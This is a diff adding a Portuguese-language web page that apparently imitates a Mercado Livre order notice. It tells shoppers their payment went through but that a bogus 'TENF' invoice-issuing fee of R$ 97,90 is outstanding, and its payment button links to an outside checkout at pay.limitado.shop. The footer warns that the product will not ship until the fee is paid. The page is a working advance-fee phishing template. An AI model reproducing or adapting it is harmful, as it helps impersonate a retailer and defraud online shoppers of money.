@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        hr {
+            margin: 0%;
+        }
+
+        .elementos {
+            margin: 0%;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        img {
+            width: 90px;
+            margin-top: 0%;
+        }
+
+        h6 {
+            color: rgb(255, 255, 255);
+            font-size: 15px;
+        }
+
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            background-color: #035DA5;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        .box {
+            color: rgb(0, 0, 0);
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgb(255, 255, 255);
+            padding: 15px;
+            border-radius: 15px;
+            width: 90%;
+            max-width: 500px;
+            height: auto;
+            overflow-y: auto;
+            margin-top: 80px;
+        }
+
+        h1 {
+            text-align: center;
+            font-size: 18px;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        h2 {
+            color: rgb(255, 255, 255);
+            text-align: center;
+        }
+
+        h3 {
+            margin: 10px auto;
+            border: solid 2px #035DA5;
+            width: 90%;
+            border-radius: 10px;
+            text-align: center;
+            padding: 5%;
+        }
+
+        button {
+            margin: 20px 0;
+            background-color: #32CD32;
+            border: none;
+            padding: 20px;
+            width: 100%;
+            border-radius: 10px;
+            color: white;
+            font-size: 14px;
+            align-items: center;
+            cursor: pointer;
+        }
+
+        h4 {
+            text-align: center;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            padding: 10px;
+        }
+
+        .footer {
+            margin-top: 20px;
+            text-align: center;
+            line-height: 1.4rem;
+            background-color: rgb(232, 229, 229);
+            padding: 2rem;
+            letter-spacing: 1px;
+            border-radius: 20px;
+            color: black;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        h5 {
+            text-align: center;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            font-size: 16px;
+            margin-top: 0%;
+        }
+
+        a {
+            text-decoration: none;
+            color: white;
+        }
+
+        .container {
+            display: none;
+            width: 90%;
+            padding: 20px;
+            border-radius: 8px;
+            background-color: #F1F5F9;
+            text-align: center;
+            font-family: Arial, sans-serif;
+        }
+
+        .alert {
+            background-color: #E2E8F0;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 16px;
+            color: #333;
+        }
+
+        .expire {
+            font-size: 18px;
+            margin: 25px 0;
+            color: #DC2626;
+        }
+
+        .pix-code {
+            margin: 15px 0;
+            padding: 10px;
+            font-size: 14px;
+            width: 100%;
+            border: 1px solid #CBD5E0;
+            border-radius: 5px;
+            background-color: #FFFFFF;
+            color: #333;
+            user-select: none;
+            box-sizing: border-box;
+        }
+
+        .copy-btn {
+            margin-top: 10px;
+            padding: 10px 20px;
+            background-color: #10B981;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            max-width: 360px;
+            box-sizing: border-box;
+        }
+
+        .copy-btn:hover {
+            background-color: #059669;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="box" id="firstBox">
+        <div style="width: 100%; text-align: center; margin: auto;">
+            <img src="https://i.postimg.cc/bJG2mh71/ML.png" alt="" srcset="" style="width: 150px; max-width: 300px; margin-bottom: 15px;">
+        </div>
+        <div style="width: 100%; text-align: center; margin: auto; font-weight: bold;">
+            Seus pedidos:<br>
+            <span style="color: black;">#6481749338</span>
+        </div>
+        <h1><b> Seu pagamento foi concluido com sucesso. </b></h1>
+        <h5 style="color: red;">Porém foi encontrado uma pendência no seu pedido.</h5>
+
+        <div id="paymentInfo">
+            <h3 style="font-size: 16px;">TENF (Taxa de Emissão da Nota Fiscal)<br><br><span style="font-size: 20px;">R$ 97,90</span></h3>
+            <a href="https://pay.limitado.shop/7vJOGY509vBGKXd">
+                <button>
+                    <b>Efetuar pagamento do Imposto de Recebimento</b>
+                </button>
+            </a>
+        </div>
+
+
+
+        <p class="footer">
+            É necessário realizar o pagamento da TENF (Taxa de Emissão da Nota Fiscal) para Emitir a Nota Fiscal do seu produto e realizarmos o despacho. Caso não finalize o pagamento da taxa, o produto não será enviado até a confirmação do pagamento.
+        </p>
+    </div>
+
+
+
+
+</body>
+
+</html>
